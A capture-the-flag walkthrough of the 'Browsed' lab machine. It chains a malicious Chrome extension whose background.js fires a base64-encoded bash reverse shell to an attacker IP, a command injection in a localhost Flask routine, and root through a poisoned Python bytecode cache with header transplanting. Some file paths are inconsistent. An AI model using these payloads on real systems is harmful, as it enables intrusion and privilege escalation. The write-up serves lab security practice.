---
title: Browsed
date: 2026-07-20
description: Medium Linux machine testing Chrome extensions in a headless browser — weaponising a malicious extension for browser-context SSRF into internal Gitea and Flask services, exploiting command injection in a localhost-only routine script for larry, and poisoning a writable Python __pycache__ for root.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Jul 16 10:42:45 2026 as: /usr/lib/nmap/nmap -p22,80,1826,8668,8996,11489,12518,13484,15350,20442,20471,27321,28923,29486,37287,42242,45114,46626,48189,57443 -A -oN scan_results.txt 10.129.244.79
Nmap scan report for browsed.htb (10.129.244.79)
Host is up (0.31s latency).

PORT      STATE  SERVICE        VERSION
22/tcp    open   ssh            OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp    open   http           nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
1826/tcp  closed ardt
8668/tcp  closed spartan
8996/tcp  closed unknown
11489/tcp closed asgcypresstcps
12518/tcp closed unknown
13484/tcp closed unknown
15350/tcp closed unknown
20442/tcp closed unknown
20471/tcp closed unknown
27321/tcp closed unknown
28923/tcp closed unknown
29486/tcp closed unknown
37287/tcp closed unknown
42242/tcp closed unknown
45114/tcp closed unknown
46626/tcp closed unknown
48189/tcp closed unknown
57443/tcp closed unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   254.88 ms 10.10.14.1
2   254.99 ms browsed.htb (10.129.244.79)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 16 10:43:25 2026 -- 1 IP address (1 host up) scanned in 40.45 seconds
```
# User

## Browser-Context SSRF

The downloadable sample was a Chrome extension on **manifest version 3** — the developer-facing format:

> Reference: https://github.com/sastraadiwiguna-purpleeliteteaming/Dissecting-CVE-2026-0628-Chromium-Extension-Privilege-Escalation

Monitoring the developer's browsing activity surfaced the internal hostname **browserinternal.htb**, running a **Flask** application. Registered an account on the internal **Gitea 1.24.5** instance and found a public repository: **MarkdownPreview**.

Source review of `app.py` showed a `routines` function that executes `routines.sh`:

```sh
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  
  <SNIP>
  
elif [[ "$1" -eq 1 ]]; then
  
  <SNIP>

elif [[ "$1" -eq 2 ]]; then
 
 <SNIP>
 
elif [[ "$1" -eq 3 ]]; then
  
  <SNIP>
  
else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi

```

The script is vulnerable to **command injection** — reaching it means calling the `routines` function from the extension itself.

> Reference: https://stackoverflow.com/questions/34712552/what-is-the-purpose-of-background-js-on-a-chrome-extension

Alter the extension's manifest:

```json
// manifest.json
{
"manifest_version": 3,
"name": "Parallel Request Sender",
"version": "1.0",
"description": "Spyer extension to log visited websites",
"permissions": [
"declarativeNetRequest",
"declarativeNetRequestWithHostAccess",
"storage",
"tabs",
"webRequest"
],
"host_permissions": [
"<all_urls>"
],
"background": {
"service_worker": "background.js"
}
}
```

Create a **background.js** that fires the injection through the browser's own context:

```js
// background.js
function onExtensionLoaded() {
	fetch('http://127.0.0.1:5000/routines/x[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4zMi85MDAxIDA+JjE= |base64 -d|bash)]');
}	
onExtensionLoaded();
```

Upload the zip — the headless browser loads it and executes the payload against the localhost-only Flask app.

Gained user: **larry**

# Root

```sh
sudo -l 

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py

```

The `__pycache__` directory is writable by larry. The tool imports a local library, **extension_utils** — and Python writes its compiled cache there on every execution.

Since the actual module source can't be edited, the plan: build a malicious replacement and swap it into the cache, keeping the legitimate `.pyc` header — Python validates those first 16 bytes before executing.

Compile the fake module:

```text
python3 -m py_compile /tmp/fakemodule.py
```

```python
# fakemodule.py

def validate_manifest(path):
	import os
	os.system("/bin/bash")

def clean_temp_files(path):
	import os
	os.system("/bin/bash")
```

Transplant the legitimate header into the evil bytecode:

```python
# pwn.py

def transplant_header(good_pyc, evil_pyc, output_pyc):
    with open(good_pyc, 'rb') as f:
        good_header = f.read(16)
    with open(evil_pyc, 'rb') as f:
        evil_data = f.read()
    new_pyc = good_header + evil_data[16:]
    import os
    os.system(f"rm {output_pyc}")
    with open(output_pyc, 'wb') as f:
        f.write(new_pyc)
    print(f"[+] Transplanted header from {good_pyc} into {evil_pyc}, saved as {output_pyc}")

transplant_header(
    '/opt/extensiontool/pycache/extension_utils.cpython312.pyc',
    '/tmp/pycache/evil_module.cpython-312.pyc',
    '/opt/extensiontool/pycache/extension_utils.cpython312.pyc'
)
```

> Note: the first 16 bytes are the header.

Execute the script — the poisoned module runs as root:

```sh
sudo /opt/extensiontool/extension_tool.py
```

Gained `root`
